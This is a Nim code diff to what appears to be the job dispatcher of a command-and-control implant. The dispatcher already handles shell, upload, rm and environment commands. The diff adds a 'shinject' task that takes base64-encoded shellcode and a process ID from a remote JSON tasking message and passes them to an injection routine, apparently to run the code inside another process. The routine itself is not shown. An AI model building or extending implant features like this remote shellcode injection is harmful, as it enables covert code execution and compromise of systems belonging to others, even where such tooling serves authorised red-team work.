@@ -25,6 +25,7 @@ import ../commands/pwd
 import ../commands/rm
 import ../commands/setenv
 import ../commands/shell
+import ../commands/shinject
 import ../commands/upload
 import ../commands/unsetenv
 
@@ -146,6 +147,10 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                let spawnResult = await shell.execute(task.parameters)
                debugMsg("spawned shell proc\n")
                temp = temp & spawnResult
+            of "shinject":
+               let spawnResult = await shinject.execute(decode(parsedJsonTask["shellcode"].getStr()), parsedJsonTask["pid"].getInt())
+               debugMsg("spawned shinject proc\n")
+               temp = temp & $(spawnResult)
             of "sleep":
                # Update and modify newConfig that will be returned with new jitter and interval values if they exist 
                newConfig.Jitter = if parsedJsonTask.hasKey("jitter"): parsedJsonTask["jitter"].getInt() else: curConfig.Jitter
